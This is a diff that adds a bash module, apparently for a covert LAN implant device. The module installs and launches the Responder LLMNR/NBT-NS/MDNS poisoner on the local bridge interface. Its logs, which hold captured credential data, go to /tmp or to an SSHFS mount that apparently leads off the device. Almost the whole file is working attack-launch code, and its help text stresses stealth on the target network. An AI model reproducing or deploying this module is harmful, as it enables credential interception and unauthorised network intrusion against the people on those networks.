@@ -1,0 +1,114 @@
+#!/bin/bash /usr/lib/turtle/turtle_module
+VERSION="1.0"
+DESCRIPTION="Responder - LLMNR, NBT-NS and MDNS poisoner"
+CONF=/tmp/responder.form
+AUTHOR=IMcPwn
+
+: ${DIALOG_OK=0}
+: ${DIALOG_CANCEL=1}
+: ${DIALOG_HELP=2}
+: ${DIALOG_EXTRA=3}
+: ${DIALOG_ESC=255}
+
+function start {
+  if [ ! -s /usr/bin/git ]; then
+     opkg update && opkg install git 
+  fi
+
+  if [[ ! -d /etc/turtle/Responder || ! -s /etc/turtle/Responder/Responder.py ]]; then
+      rm -r /etc/turtle/Responder
+      git clone git://github.com/SpiderLabs/Responder /etc/turtle/Responder
+  fi
+
+if [ -s /etc/config/responder ];
+  then
+    responder_log=$(uci get responder.log)
+    case $responder_log in
+      sshfs)
+        if pgrep sshfs > /dev/null; then 
+          echo "SSHFS Running"
+          if [[ ! -L /etc/turtle/Responder/logs || ! -L /sshfs/Responder/logs ]]; then
+		rm -r /etc/turtle/Responder/logs
+		mkdir -p /sshfs/Responder/logs
+		ln -s /sshfs/Responder/logs /etc/turtle/Responder/logs
+                echo "python /etc/turtle/Responder/Responder.py -I br-lan" | at now
+  		echo responder started and logs are being saved to /sshfs
+          fi 
+        else 
+          echo "SSHFS not running"
+        fi
+        ;;
+      tmp)
+	if [[ ! -L /etc/turtle/Responder/logs || ! -L /tmp/Responder/logs ]]; then
+        	rm -r /etc/turtle/Responder/logs
+		mkdir -p /tmp/Responder/logs
+		ln -s /tmp/Responder/logs /etc/turtle/Responder/logs
+                echo "python /etc/turtle/Responder/Responder.py -I br-lan" | at now
+  		echo responder started and logs are being saved to /tmp
+	fi
+        ;;
+    esac
+  else
+    echo "Responder not configured."
+  fi
+}
+
+function stop {
+  kill $(ps | grep -w [/]etc/turtle/Responder/Responder.py | awk {'print $1'})
+}
+
+function status {
+  if ps | grep -w -q [/]etc/turtle/Responder/Responder.py; then echo "1"; else echo "0"; fi
+}
+
+function configure {
+  if [ -s /etc/config/responder ]
+  then
+    responder_log=$(uci get responder.log)
+  else
+    touch /etc/config/responder
+  fi
+
+  dialog --ok-label "Submit" \
+    --help-button \
+    --title "Responder Configuration" \
+    --radiolist "\n\
+Responder is an LLMNR, NBT-NS and MDNS poisoner.\n\nNOTICE: The first time you run this module it may take a long time to load. Please let it finish.\n\nThe log files can be saved to SSHFS or /tmp.\n" 16 60 3\
+    1 "Save log to SSHFS if available." off\
+    2 "Save log to /tmp/" off\
+  2>$CONF
+
+  return=$?
+
+  case $return in
+    $DIALOG_OK)
+      LOG=$(cat $CONF)
+      case $LOG in
+        1)
+          uci set responder.log="sshfs"
+          uci commit responder
+          ;;
+        2)
+          uci set responder.log="tmp"
+          uci commit responder
+          ;;
+      esac
+    ;;
+    $DIALOG_CANCEL)
+      rm $CONF
+      clear
+      exit;;
+    $DIALOG_HELP)
+      dialog --title "Help" \
+        --msgbox "\
+Responder an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409).\n\
+By default, the tool will only answer to File Server Service request, which is for SMB.\n\n\
+The concept behind this is to target our answers, and be stealthier on the network. This also helps to ensure that we don't break legitimate NBT-NS behavior.\n\n\
+For more information, see: https://github.com/SpiderLabs/Responder\n\
+" 20 60
+      configure
+      ;;
+    $DIALOG_ESC)
+      clear;;
+  esac
+}
